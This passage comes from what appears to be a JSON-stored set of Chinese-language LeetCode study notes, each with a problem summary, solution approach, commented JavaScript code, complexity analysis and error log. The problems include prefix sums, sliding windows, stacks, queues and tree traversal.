的和\n  const preSum = new Array(nums.length + 1).fill(0);\n  // 返回值\n  let res = 0;\n  // countMap 存储每个前缀和出现的次数\n  const countMap = new Map();\n  // 前缀和 的第一个元素 0 出现了一次\n  countMap.set(0, 1);\n\n  // 边遍历，边计算前缀和\n  for (let i = 1; i <= nums.length; i++) {\n    // 计算前缀和\n    preSum[i] = preSum[i - 1] + nums[i - 1];\n    \n    //******** 然后看看：是否存在两个前缀和之差为 k ********\n    \n    // 如果 preSum[i] - k 在 countMap 中\n    // 说明存在 preSum[j] = preSum[i] - k 即 nums[j] 到 nums[i-1] 的和为 k\n    const target = preSum[i] - k;\n    // 前缀和中有 target\n    if (countMap.has(target)) {\n      res += countMap.get(target);\n    }\n    // 更新 countMap\n    countMap.set(preSum[i], (countMap.get(preSum[i]) || 0) + 1);\n  }\n\n  return res;\n};\n\n```\n\n#### 复杂度分析\n\n\n- 时间复杂度：`O(n)`\n\t- 主循环：\n\t   - 算法只有一个主循环，遍历整个数组一次。\n\t   - 循环次数为 n+1（其中 n 是数组 nums 的长度）。\n\t- 循环内的操作：\n\t   - 前缀和计算：O(1)\n\t   - 哈希表查找（countMap.has 和 countMap.get）：平均 O(1)\n\t   - 哈希表更新（countMap.set）：平均 O(1)\n\t- 总体：\n\t   - 由于循环执行 n+1 次，每次循环内的操作都是 O(1)，因此总的时间复杂度是 O(n)。\n- 空间复杂度：`O(n)`\n\t- 前缀和数组 preSum：\n\t   - 大小为 n+1，占用 O(n) 空间。\n\t- 哈希表 countMap：\n\t   - 在最坏情况下，可能需要存储所有不同的前缀和。\n\t   - 理论上最多可能有 n+1 个不同的前缀和。\n\t   - 因此，countMap 占用 O(n) 空间。\n\t- 其他变量（res, target 等）：\n\t   - 占用常数空间，O(1)。\n\t- 总体：\n\t   - 空间复杂度主要由 `preSum 数组` 和 `countMap` 决定，因此为 `O(n)`\n\n## 错误记录\n\n遍历时，需要遍历 `n+1` ，即 `i<=nums.length` ，如下：\n\n```javascript\nfor (let i = 1; i <= nums.length; i++) {\n```\n\n","7c7W9YVP":"\n# 种花问题\n\n\n`#算法` `#leetcode`  `#2024/07/28` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目 \n\n![image.png|648](https://832-1310531898.cos.ap-beijing.myqcloud.com/3f1ea7b209fa83f23540a2c340ecfa50.png)\n\n### 1.1. 重点\n\n- 转成规则：即上图中红色文字部分\n\n## 2. 思路\n\n1. `遍历数组`：从头到尾遍 `flowerbed` 数组。\n2. `检查位`：如果当前位置是 `0`，并且其两侧（如果存在的话）也是 `0` 或 `1`，则表示这里可以种花。\n3. 种花并调整`**计数器**`：每种一朵，减少 `n` 的值。当 `n` 减到 `0` 以下时，表示可以种下 `n` 朵花，返回 `true`。\n4. `最终检查`：遍历完数组后，检查 `n` 是否小或等于 `0`。\n\n## 3. 代码实现\n\n```javascript\n/**\n * @param {number[]} flowerbed\n * @param {number} n\n * @return {boolean}\n */\nvar canPlaceFlowers = function (flowerbed, n) {\n  for (let i = 0; i < flowerbed.length; i++) {\n    // 检查当前位置及左、右位置是否可以种花，需要满足以下条件：\n    // 条件①： 当前元素为0\n    if (flowerbed[i] === 0) {\n      // 条件②： 第一个元素 或者 前一个元素为0时\n      if (i === 0 || flowerbed[i - 1] === 0) {\n        // 条件③： 最后一个元素 或者 后一个元素为0时\n        if (i === flowerbed.length - 1 || flowerbed[i + 1] === 0) {\n          flowerbed[i] = 1;\n          n--;\n        }\n      }\n    }\n  }\n  return n <= 0;\n};\n```\n\n> - 上面的写法，只是为了表达递进的关系，其实可以不这么写！\n> - 注意每个条件里面是`或者`的关系\n\n## 4. 参考\n\n- [https://leetcode.cn/problems/can-place-flowers/submissions/548039007/?envType=study-plan-v2&envId=leetcode-75](https://leetcode.cn/problems/can-place-flowers/submissions/548039007/?envType=study-plan-v2&envId=leetcode-75)\n\n","y9qe2vTC":"\n# 子数组最大平均数 I\n\n\n`#leetcode` `#算法/滑动窗口` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png|608](https://832-1310531898.cos.ap-beijing.myqcloud.com/400755e6e2354c1f2047b7ed1977227b.png)\n\n> **注意：返回的是最大平均树**\n\n## 解题思路\n\n### 解法一：滑动窗口，看下面几张图\n\n![image.png|520](https://832-1310531898.cos.ap-beijing.myqcloud.com/d519707b0a58722271e07e52f00ca916.png)\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/67925ec639e4c341ddabdba40ca16863.png)\n\n![image.png|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/c0a15fa222bab11b280369e83f570392.png)\n\n### 解法二：前缀和\n\n> 不展开了\n\n## 代码实现\n\n```javascript\n/**\n * @param {number[]} nums\n * @param {number} k\n * @return {number}\n */\nvar findMaxAverage = function (nums, k) {\n  // sum 用于记录滑动窗口中的元素之和\n  let sum = 0;\n  // 前 k 个元素之和，即滑动窗口的初始值，即【滑动窗口】的前 k 个元素之和\n  // 初始化 sum，代表【滑动窗口】的前 k 个元素之和\n  for (let i = 0; i < k; i++) {\n    sum += nums[i];\n  }\n\n  // max 用于记录滑动窗口中元素之和的最大值\n  let max = sum;\n\n  // 开始滑动窗口，从 k 开始，每次移动一位，动态维护 sum 和 max 的值\n  // 遍历数组，从 k 开始\n  for (let i = k; i < nums.length; i++) {\n    // 滑动窗口，每次移动一位\n    sum = sum + nums[i] - nums[i - k];\n    // 比较 sum 和 max 的大小，取最大值\n    max = Math.max(max, sum);\n  }\n\n  // 最后返回 max / k，即最大平均值\n  return max / k;\n};\n\n```\n\n### 复杂度分析\n\n- 时间复杂度：`O(n)`，其中 n 是数组的长度。我们只遍历了一次数组。 \n- 空间复杂度：`O(1)`，我们只使用了常数额外空间。\n\n## 错误记录\n\n","kSBD4L2E":"\n# Dota2 参议院\n\n\n`#2024/07/28` `#leetcode`  `#算法/列队` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png600](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407281543283.png?imageSlim)\n\n### 更通俗的解释\n\n你可以把这题想象成一个`“淘汰赛”`的过程。每个参议员在“发言”后可以让对方阵营中的一个人`闭嘴`（无法再发言）。这个过程一直持续，直到某一阵营的所有人都被关闭，另外一阵营获胜。\n\n#### 题目中的“参议院”\n\n- **输入**：一个字符串，代表所有参议员的`初始顺序`。\n- **输出**：一个字符串，代表`最终获胜的阵营`。\n    **举例**：\n    - 输入：`\"RDD\"`\n    - 输出：\"D\"（夜魇阵营获胜）\n        - 因为 R 先让\n\n## 解题思路\n\n为了简化处理，可以使用队列来模拟这个过程：\n1. **初始化**：\n    - 用`两个队列`分别存储天辉参议员和夜魇参议员的`索引位置`。\n2. **模拟投票过程**：\n    - 比较`两个队列头部的索引`，投票次序取决于小的索引值。\n    - 被“禁言”的参议员的索引需要被移除。\n    - 并且被移动的参议员要被放到新位置上（假设投票结束的参议员可以重新排队）。\n3. **判断胜利**：\n    - `队列为空的一方`即为`失败方`\n    - `一个队列中的参议员`即为`胜利方`\n\n## 代码实现\n\n```javascript\n/**\n * @param {string} senate\n * @return {string}\n */\nvar predictPartyVictory = function (senate) {\n  // ① 定义两个队列，分别存储 R 和 D 的索引\n  const radiant = [];\n  const dire = [];\n\n  // ② 遍历字符串，将 R 和 D 的索引分别入队\n  for (let i = 0; i < senate.length; i++) {\n    if (senate[i] === \"R\") {\n      radiant.push(i);\n    } else {\n      dire.push(i);\n    }\n  }\n\n  // ③ 模拟投票过程\n  while (radiant.length > 0 && dire.length > 0) {\n    // 分别取出 R 和 D 的索引\n    let rIndex = radiant.shift();\n    let dIndex = dire.shift();\n\n    // 比较索引决定谁先投票，如果radiant先投票则dire被禁言，反之亦然\n    if (rIndex < dIndex) {\n      //  这个 R 其实可以继续参加，所以把他放到最后，才能循环参与投票。\n      //  每个参议员在投票后并不是退出游戏，而是要回到队列末尾，等待下一轮投票机会\n      //  `rIndex` 是当前参议员在原始字符串中的索引位置。\n      //  `rIndex + senate.length` 是为了确保这个参议员在下一轮投票时,仍然保持正确的相对顺序。\n      radiant.push(rIndex + senate.length); // 重新排队，以确保顺序循环进行\n    } else {\n      dire.push(dIndex + senate.length); // 重新排队，以确保顺序循环进行\n    }\n  }\n\n  // ④ 返回结果: 如果 R 的队列长度大于 0，则返回 Radiant，否则返回 Dire\n  return radiant.length > 0 ? \"Radiant\" : \"Dire\";\n};\n\n```\n\n每个参议员在投票后并不是退出游戏，而是要回到队列末尾，等待下一轮投票机会。\n\n### 为什么要加上 senate.length\n\n假设有字符串 `\"RDDR\"`，长度为 `4` \n\n初始状态:\n\n```javascript\nradiant = `[0, 3]`  // R在位置0和3\ndire = `[1, 2]`     // D在位置1和2\n```\n\n第一轮投票后:\n- `R(0)` 投票并禁言 `D(1)`\n- 我们需要把 `R(0)` 放回队列末尾\n\t- 如果直接 `push(0)`，变成 `radiant = [3, 0]`\n\t- 这样就打乱了原有顺序。正确的应该是：`radiant = [3, 4]`  其中 `4 = 0 + 4(字符串长度)` 这样就维持了相对顺序\n\n通过加上字符串长度,我们保证了:\n- 新加入的元素总是大于当前队列中的所有元素\n- 同时保持了参议员之间的相对顺序不变\n\n### 复杂度分析\n\n- **时间复杂度**：\n    - 初始化队列需要 `O(n)` 时间，每个字符入队和出队的操作均为 `O(1)`，整体时间复杂度为 `O(n)`。\n- **空间复杂度**：\n    - 队列存储所有参议员的索引，因此需要 `O(n)` 的空间。\n\n## 错误记录","Cf7RbazE":"\n# 寻找数组的中心下标\n\n`#2024/07/28` `#leetcode`  `#算法/前缀和`  \n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png|616](https://832-1310531898.cos.ap-beijing.myqcloud.com/806cae66a6a82c0cf9ac12cab22d1c66.png)\n\n## 解题思路\n\n- 前缀和 `preSum`\n- 假设原数组 nums = [1, 7, 3, 6, 5, 6]\n   - 前缀和数组 `prefixSum` 就会是：[0, 1, 8, 11, 17, 22, 28]\n      - 长度为 `length + 1 ` \n      - 第一个元素为 `0`，表示前 `0` 个元素的和\n      - `preSum[i]` 表示前 `i` 个元素的和\n\n## 代码实现\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {number}\n */\nvar pivotIndex = function (nums) {\n  // 前缀和数组\n  // 注意：前缀和数组的长度为 nums.length + 1，第一个元素为 0，表示前 0 个元素的和\n  // preSum[i] 表示前 i 个元素的和\n  // 这种方式可以：避免判断边界条件\n  let preSum = new Array(nums.length + 1).fill(0);\n  // 初始化前缀和数组\n  for (let i = 1; i <= nums.length; i++) {\n    // 当前元素的前缀和 = 前一个元素的前缀和 + 当前元素\n    preSum[i] = preSum[i - 1] + nums[i - 1];\n  }\n  // 根据前缀和判断左半边数组和右半边数组的元素和是否相同\n  for (let i = 0; i < nums.length; i++) {\n    // 当前元素之前的元素和 = 当前元素之后的元素的和\n    // 当前元素右边的元素和 = 当前元素之前的元素的和，\n    // 注意①：当前元素不参与计算\n    // 注意②：preSum[nums.length] 表示整个数组的和\n    // 注意③：当前元素右边的元素和 = 整个数组的和 - 当前元素之后的元素的前缀和\n    if (preSum[i] === preSum[nums.length] - preSum[i + 1]) {\n      return i;\n    }\n  }\n  return -1;\n};\n```\n\n### 复杂度分析\n\n## 错误记录\n\n- 而`当前元素`不参与计算\n- 注意前缀和初始化遍历是从`1` 开始的\n\n","lkcKBVSp":"\n# 矩阵置零\n\n\n`#leetcode`   `#2024/08/26`  `#算法`  `#算法/矩阵` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n> 原题： https://leetcode.cn/problems/set-matrix-zeroes/\n\n![cos-blog-832-34-20241012|656](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240826073718.png)\n\n题意好理解，读一遍就知道了\n\n## 2. 解题思路\n\n使用原矩阵的第一行和第一列来记录是否需要置为 0，具体思路如下：\n1. **标记第一行和第一列**\n    - 首先检查第一行和第一列是否有零，并用两个布尔变量 `firstRowZero` 和 `firstColZero` 记录下来。\n2. **使用第一行和第一列作为标记**\n    - 从**第二行**和**第二列**开始遍历矩阵\n        - 如果遇到零，就在对应的**第一行**和**第一列**的位置上标记为零\n3. **根据标记置零**\n    - 再次遍历矩阵（从第二行和第二列开始）\n    - 根据第一行和第一列的标记，如果是 0，则将对应的元素置零\n4. **处理第一行和第一列**\n    - 根据 `firstRowZero` 和 `firstColZero` 的值，决定是否将第一行和第一列置零。\n\n这种方法通过在原矩阵中利用第一行和第一列记录状态，避免了额外的空间消耗，符合题目要求的**原地**修改。\n\n## 3. 代码实现\n\n```javascript\n/**  \n * @param {number[][]} matrix  \n * @return {void} Do not return anything, modify matrix in-place instead.  \n */var setZeroes = function(matrix) {  \n    const m = matrix.length;  \n    const n = matrix[0].length;  \n    let firstRowHasZero = false;  \n    let firstColHasZero = false;  \n    /*************************************************  \n     * ::::① 首先检查第一行和第一列是否有零，\n     * 并用两个布尔变量`firstRowZero`和`firstColZero`记录下来  \n     ************************************************/  \n    // 检测第一行是否有 0 ，记得 break    for (let j = 0; j < n; j++) {  \n        if (matrix[0][j] === 0) {  \n            firstRowHasZero = true;  \n            break;  \n        }  \n    }  \n    // 检测第一列是否有 0 ，记得 break    for (let i = 0; i < m; i++) {  \n        if (matrix[i][0] === 0) {  \n            firstColHasZero = true;  \n            break;  \n        }  \n    }  \n    /*************************************************  \n     * :::::② 遍历除第一行和第一列以外的所有元素，\n     * 如果有零则将对应的第一行和第一列的元素置零  \n     ************************************************/  \n    for (let i = 1; i < m; i++) {  \n        for (let j = 1; j < n; j++) {  \n            if (matrix[i][j] === 0) {  \n            // 将第一行和第一列作为标志位, 标记该行或该列是否需要清零  \n            // 如果 matrix[i][j] === 0, 则将 matrix[i][0] 和 matrix[0][j] 置为 0               // 即将该行和该列的第一个元素置为 0，标记该行和该列需要清零  \n                matrix[i][0] = matrix[0][j] = 0;  \n            }  \n        }  \n    }  \n    /*************************************************  \n     * ::::::③ 根据第一行和第一列的标志位对矩阵的其余元素进行清零  \n     ************************************************/  \n    // 从第二行第二列开始遍历，如果 matrix[i][0] === 0 或 matrix[0][j] === 0，  \n    // 则将 matrix[i][j] 置为 0    \n    for (let i = 1; i < m; i++) {  \n        for (let j = 1; j < n; j++) {  \n            if (matrix[i][0] === 0 || matrix[0][j] === 0) {  \n                matrix[i][j] = 0;  \n            }  \n        }  \n    }  \n    /*************************************************  \n     * ::::::④ 根据第一个元素标记的第一行和第一列是否需要清零  \n     ************************************************/  \n    // 如果第一行需要清零  \n    if (firstRowHasZero) {  \n        for (let j = 0; j < n; j++) {  \n            matrix[0][j] = 0;  \n        }  \n    }  \n    // 如果第一列需要清零  \n    if (firstColHasZero) {  \n        for (let i = 0; i < m; i++) {  \n            matrix[i][0] = 0;  \n        }  \n    }  \n};\n```\n\n## 4. 复杂度分析\n\n- 时间复杂度是 `O(m*n)`，\n- 空间复杂度是 `O(1)`，符合题目要求的**原地算法**\n\n## 5. 问题记录\n\n### 5.1. 使用原矩阵的第一行和第一列来记录状态不会污染原有数据吗？\n\n使用原矩阵的第一行和第一列来记录状态不会污染原有数据，因为：\n1. **提前记录状态**：在标记之前，先用两个布尔变量 `firstRowZero` 和 `firstColZero` 记录第一行和第一列是否有零。\n2. **从第二行和第二列开始标记**\n\t- 只从第二行和第二列开始使用标记，避免影响第一行和第一列的原始状态。\n\t- 虽然标记的是第一行或第一列，但是如果这一行或者这一列已经有 0，那么最终第一行（或列）最终还得是 0\n3. **最后处理第一行和第一列**：根据之前记录的布尔变量，最后再决定是否将第一行和第一列置零。\n\n这样可以安全地使用第一行和第一列来存储标记信息，而不影响最终结果。\n\n","5nrRyaXj":"\n# 小行星碰撞\n\n`#2024/07/28`  `#算法/栈`  `#leetcode` \n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png600|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407271746254.png?imageSlim)\n\n## 解题思路\n\n1. 初始化一个`空栈`，用于存储当前状态的“小行星”。\n2. 遍历输入的小行星数组：\n    - ① 定义一个变量`destroyed` ，标识当前元素是否被摧毁\n    - ② **while循环**：如果栈不为空，且当前元素为负数 `向左移动`，且栈顶元素为正数，向右移动\n\t\t- 如果栈顶小行星更小，则`栈顶小行星`被摧毁，`continue`  while 遍历\n\t\t- 如果栈顶小行星更大，则`当前小行星`被摧毁，`break`  while 遍历\n\t\t- 若两者质量相等，则它们相互抵消，`都被摧毁`，`break` while 遍历\n    - ③ 如果当前元素`没有被摧毁`，入栈\n3. 最后 `res`\n\n>  栈顶元素被销毁，代表 `出栈`\n>  当前元素被销毁，代表 `不入栈`\n\n## 代码实现\n\n```javascript\n/**\n * @param {number[]} items\n * @return {number[]}\n */\nvar itemCollision = function (items) {\n  const stack = [];\n\n  // 遍历数组\n  for (let item of items) {\n    // ① 定义一个变量`destroyed` ，标识当前元素是否被摧毁\n    let destroyed = false;\n\n    // 如果栈不为空，且当前元素为负数，且栈顶元素为正数\n    while (stack.length > 0 && item < 0 && stack[stack.length - 1] > 0) {\n      let top = stack[stack.length - 1];\n      // 如果栈顶元素的绝对值小于当前元素的绝对值，则栈顶元素被销毁\n      if (top < -item) {\n        stack.pop();\n        continue;\n      }\n      // 如果栈顶元素的绝对值大于当前元素的绝对值，则当前元素被销毁\n      else if (top > -item) {\n        destroyed = true;\n        break;\n      }\n      // 如果栈顶元素的绝对值等于当前元素的绝对值，则栈顶元素和当前元素都被销毁\n      else if (top === -item) {\n        stack.pop();\n        destroyed = true;\n        break;\n      }\n    }\n\n    // 如果当前元素没有被销毁，则入栈\n    if (!destroyed) {\n      stack.push(item);\n    }\n  }\n\n  return stack;\n};\n\n```\n\n### 复杂度分析\n\n#### 时间复杂度\n\n遍历数组是 `O(n)`，而内部的 `while` 循环在整个算法过程中也为 `O(2)`（每个元素最多只会进出栈一次），所以整体时间复杂度为 `O(n)`\n\n#### 空间复杂度\n\n1. **栈的使用**：\n    - 由于算法使用了一个栈 `stack` 来存储未被摧毁的元素。\n    - 最坏情况下，所有元素都不会相互碰撞（例如，全为正数或全为负数），则栈的大小为 `n`。\n2. **额外空间**：\n    - 除了栈之外，没有使用额外的显著空间。\n\n因此，空间复杂度也是 `O(n)`。\n\n## 错误记录\n\n![image.png600](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407280720119.png?imageSlim)\n","nWavFLlx":"\n# 最小覆盖子串\n\n\n`#leetcode`   `#2024/08/11`  `#算法/滑动窗口`  `#算法/双指针` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240811134319.png)\n\n## 2. 解题思路：滑动窗口\n\n- 定义 7 个变量\n\t- 两个 Map：`need` 和 `window`\n\t\t- `need` 存储 `t` 中每个字符需要的数量\n\t\t- `window` 存储当前窗口中每个字符的数量\n\t- 两个指针 `left` 和 `right` ：用于定义滑动窗口\n\t-  `valid 变量`来记录当前窗口中**已经满足条件的字符数量**\n\t- `start` 和 `len` 记录最小覆盖子串的起始索引及长度\n- 滑动窗口\n\t-  `右指针 right` 不断向右移动，**扩大窗口**，将字符加入 `window`。\n\t- 当 `valid === need` 时\n\t\t- 说明窗口中已经包含了 `t` 的所有字符，此时开始尝试**缩小窗口**\n\t\t\t- 当一个字符加入 window 后，如果它的数量与 need 中的数量相等，则 valid 加 1。\n\t\t\t\t- `左指针 left` 向右移动，缩小窗口，同时更新 window 和 valid。\n\t\t\t\t- 在每次找到可行解时，更新最小覆盖子串的`起始位置`和`长度`。\n- 最后返回最小覆盖子串，如果没有找到，则返回空字符串。\n\n## 3. 代码实现\n\n```javascript hl:8,27,43\n/**\n * @param {string} s\n * @param {string} t\n * @return {string}\n */\nvar minWindow = function (s, t) {\n    /*************************************************\n     * ::::① 第一步： 定义 7 个变量并初始化\n     ************************************************/\n        // 记录窗口所需要的字符及其个数\n    const need = new Map();\n    // 初始化 need\n    for (const c of t) {\n        need.set(c, (need.get(c) || 0) + 1);\n    }\n    // 记录当前窗口中的字符及其个数\n    const window = new Map();\n    // 双指针\n    let left = 0;\n    let right = 0;\n    // 已经符合条件的字符个数\n    let valid = 0;\n    // 记录最小覆盖子串的起始索引及长度\n    let start = 0;\n    let len = Infinity;\n    /*************************************************\n     * :::::② 第二步：开始移动右指针，扩大窗口\n     ************************************************/\n    for (let i = 0; i < s.length; i++) {\n        const c = s[i]; // c 是将移入窗口的字符\n        right++;// 右移窗口\n        // 如果 c 是所需字符，则更新窗口数据\n        if (need.has(c)) {\n            window.set(c, (window.get(c) || 0) + 1);\n            // 如果 window 中字符 c 的数量达到 need 中字符 c 的数量，则 valid++\n            // valid 表示窗口中满足 need 条件的字符个数，所以它是去重的\n            // 例如 need 中有 2 个 a，window 中也有 2 个 a，那么 valid 只会加 1\n            if (window.get(c) === need.get(c)) {\n                valid++;\n            }\n        }\n        /*************************************************\n         * ::::③ 第三步：判断左侧窗口是否要收缩，条件是 valid === need.size\n         ************************************************/\n        while (valid === need.size) {\n            // 这个时候满足条件，记录最小覆盖子串\n            // 更新 start 和 len, 用于最后返回结果\n            if (right - left < len) {\n                start = left;\n                len = right - left;\n            }\n            const d = s[left];// d 是将移出窗口的字符\n            // 左移窗口\n            left++;\n            // 如果 d 是所需字符，同事需要更新窗口数据 和 valid 值\n            if (need.has(d)) {\n                if (window.get(d) === need.get(d)) {\n                    valid--;\n                }\n                window.set(d, window.get(d) - 1);\n            }\n        }\n    }\n    return len === Infinity ? '' : s.substr(start, len);\n};\n\n```\n\n### 3.1. 复杂度分析\n\n- 时间复杂度是 `O(n)`，其中 n 是**字符串 s 的长度**。\n- 空间复杂度是 `O(k)`，其中 k 是**字符集的大小**（在这个问题中，**k 最大为 52**，因为字母区分大小写）\n\n","qmOWz45b":"\n# 删除有序数组中的重复项 II\n\n\n`#算法/双指针`  `#2024/07/28` `#leetcode` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![image.png600|696](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407281632176.png?imageSlim)\n\n## 2. 解题思路\n\n- 双指针\n\t- `count = 0/1/2` ，计算重复次数\n\t- 记得需要重置为 0  ，当 `nums[fast] !== nums[fast - 1]`\n\n## 3. 代码实现\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {number}\n */\nvar removeDuplicates = function (nums) {\n  // 快慢指针,都从0开始\n  let slow = 0;\n  let fast = 0;\n  // 用于记录重复元素的个数，初始值为0，最多只能有两个重复元素\n  let count = 0;\n  // 快指针遍历数组\n  while (fast < nums.length) {\n    // 当快指针对应的元素不等于慢指针对应的元素时\n    if (nums[fast] !== nums[slow]) {\n      // 慢指针向后移动一位\n      slow++;\n      // 将快指针对应的元素赋值给慢指针对应的元素\n      nums[slow] = nums[fast];\n      // 此时，对于 nums[0..slow] 来说，nums[fast] 重复次数小于 2，也加进来\n    } else if (slow < fast && count < 2) {\n      // 慢指针向后移动一位\n      slow++;\n      // 将快指针对应的元素赋值给慢指针对应的元素\n      nums[slow] = nums[fast];\n    }\n    // 快指针，每遍历一个元素，就向后移动一次\n    fast++;\n    // 计数器，记录重复元素的个数\n    count++;\n    // fast 遇到新的不同的元素时，重置 count\n    if (fast < nums.length && nums[fast] !== nums[fast - 1]) {\n      count = 0;\n    }\n  }\n  // 删除后面的元素\n  nums.splice(slow + 1);\n  return slow + 1;\n};\n\n```\n\n> 记得最后删除元素\n\n## 4. 错误记录\n\n","S78XZC41":"\n# 钥匙和房间\n\n\n`#2024/09/11` `#图` `#算法/图` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及题意 \n\n> https://leetcode.cn/problems/keys-and-rooms/description/\n\n![cos-blog-832-34-20241012|648](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240911065626.png)\n\n## 2. 思路\n\n- 看**示例 1** ，这不就是一个图吗，root 是`房间1` ，然后`房间1` 里的`钥匙`决定了指向哪几个房间\n- 题设中的 `rooms` 就是一个**邻接表表示的图**\n\n所以，我们先来看**图的遍历框架**\n\n```javascript\n/**\n * @description 图的遍历框架\n * @param {*} rooms 代表房间的二维数组，邻接表\n * @param {*} room  代表当前房间的编号\n * @param {*} visited  代表当前房间是否已经访问过\n * @returns\n */\nfunction dfs(rooms, room, visited) {\n  if (visited[room]) {\n    return;\n  }\n  // 前序位置，标记房间已访问\n  visited[room] = true;\n\n  for (var nextRoom of rooms[room]) {\n    dfs(rooms, nextRoom, visited);\n  }\n}\n```\n\n## 3. 最终代码\n\n```javascript\n/**\n * @description 图的遍历框架\n * @param {*} rooms 代表房间的二维数组，邻接表\n * @param {*} room  代表当前房间的编号\n * @param {*} visited  代表当前房间是否已经访问过\n * @returns\n */\nfunction dfs(rooms, room, visited) {\n  if (visited[room]) {\n    return;\n  }\n  // 前序位置，标记房间已访问\n  visited[room] = true;\n\n  for (var nextRoom of rooms[room]) {\n    dfs(rooms, nextRoom, visited);\n  }\n}\n\nfunction canVisitAllRooms(rooms) {\n  var len = rooms.length;\n  // 记录每个房间是否已经访问，使用数组来表示\n  var visited = new Array(len).fill(false);\n  // 房间号从 0 开始\n  var rootNum = 0;\n  // 广度优先遍历，遍历完后，visited 中所有的值都应该为 true，否则返回 false\n  dfs(rooms, 0, visited);\n\n  for (var v of visited) {\n    if (!v) {\n      return false;\n    }\n  }\n  return true;\n}\n```\n\n\n## 4. 复杂度分析\n\n这个算法使用深度优先搜索（DFS）来判断是否可以访问所有的房间。我们来分析一下它的时间复杂度和空间复杂度。\n\n### 4.1. 时间复杂度\n\n1. **DFS 遍历的复杂度**：\n   - 每个房间只会被访问一次，因为在访问一个房间时，都会将其标记为已访问。\n   - 对于每个房间，遍历其所有邻接房间（即钥匙所指向的房间）。\n   - 因此，遍历的总操作数与房间的总数量 \\( n \\) 和钥匙的总数量（即边的总数 \\( E \\)）成正比。\n\n综上所述，时间复杂度为 \\( O(n + E) \\)，其中 \\( n \\) 是房间的数量，\\( E \\) 是钥匙的数量。\n\n### 4.2. 空间复杂度\n\n1. **递归栈空间**：\n   - DFS 使用递归实现，递归的深度最坏情况下为房间的数量 \\( n \\)，因此递归栈的空间复杂度为 \\( O(n) \\)。\n2. **visited 数组**：\n   - 需要一个大小为 \\( n \\) 的数组来记录每个房间是否被访问过，空间复杂度为 \\( O(n) \\)。\n\n因此，总的空间复杂度为 \\( O(n) \\)。\n\n### 4.3. 总结\n\n- **时间复杂度**: \\( O(n + E) \\)\n- **空间复杂度**: \\( O(n) \\)\n\n这个算法在处理稀疏图（即钥匙数量较少）时表现良好，因为时间复杂度主要受房间和钥匙的数量影响。\n\n\n","fisDyATh":"\n# 叶子相似的树\n\n\n`#leetcode`   `#2024/08/11`  `#算法/二叉树` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240811164506.png)\n\n## 2. 解题思路\n\n1. 分别获取两棵树的**叶值序列**\n\t- 遍历一遍树\n\t- 当遇到叶节点（**左右子节点都为空**）时，将其值加入序列\n2. 比较两个序列是否相同\n\n## 3. 代码实现\n\n```javascript\n/**\n * @param {TreeNode} root1\n * @param {TreeNode} root2\n * @return {boolean}\n */\nvar leafSimilar = function (root1, root2) {\n    // 获取叶子节点的序列\n    const getSeq = (root) => {\n        const res = [];\n        // 前序遍历\n        const traverse = (node) => {\n            if (!node) {\n                return;\n            }\n            if (!node.left && !node.right) {\n                res.push(node.val);\n            }\n            traverse(node.left);\n            traverse(node.right);\n        }\n        traverse(root);\n        return res;\n    }\n    const seq1 = getSeq(root1);\n    const seq2 = getSeq(root2);\n    // 比较两个序列是否相同\n    // 如果长度不同，直接返回 false\n    if (seq1.length !== seq2.length) {\n        return false;\n    }\n    // 逐个比较, 如果有不同的元素，直接返回 false\n    for (let i = 0; i < seq1.length; i++) {\n        if (seq1[i] !== seq2[i]) {\n            return false;\n        }\n    }\n    // 最后，两个序列完全相同，返回 true\n    return true;\n};\n```\n\n## 4. 复杂度分析\n\n- 时间复杂度：`O(n1 + n2)`\n\t- n1 和 n2 分别是两棵树的节点数。\n\t- `getSeq 函数`对每棵树进行一次完整的遍历，时间复杂度为 O(n)。\n\t\t- 对于root1 和 root2，我们分别调用一次getSeq，所以这部分的时间复杂度是 `O(n1 + n2)`。\n\t- 最后的比较过程，最坏情况下需要比较所有叶子节点，但这个操作的时间复杂度不会超过 `O(min(n1, n2))`。\n\t- 因此，总的时间复杂度是 O(n1 + n2)。\n- 空间复杂度：`O(h1 + h2 + L)`\n\t-  h1 和 h2 分别是两棵树的高度。\n\t- L 是叶子节点的数量，最坏情况下 `L = min(n1, n2)`。\n\t- 递归调用栈的深度最大为树的高度，因此需要 O(h1) 和 O(h2) 的空间。\n\t- seq1 和 seq2 数组存储叶子节点值，共需要 `O(L)` 的空间。\n\t- 因此，总的空间复杂度是 `O(h1 + h2 + L)`。\n- 最坏情况分析：\n\t- 在最坏情况下，当树完全不平衡（如链状结构）时，h1 可能等于 n1，h2 可能等于 n2。\n\t- 此时，空间复杂度可能退化为 `O(n1 + n2)`。\n- 平均情况分析：\n\t- 对于较为平衡的树，h1 和 h2 通常远小于 n1 和 n2。\n\t- 在这种情况下，空间复杂度会更接近 O(log(n1) + log(n2) + L)。\n\n## 5. 优化建议\n\n- 可以考虑**使用迭代器或生成器**来逐个生成和比较叶子节点，而不是先存储完整的序列。\n\t- 这样可以将空间复杂度降低到 **O(h1 + h2)**，但可能会稍微增加时间复杂度\n\n## 6. 错误记录\n\n> [!danger]\n> 注意最后返回 ture\n","bEEJk1iV":"\n# 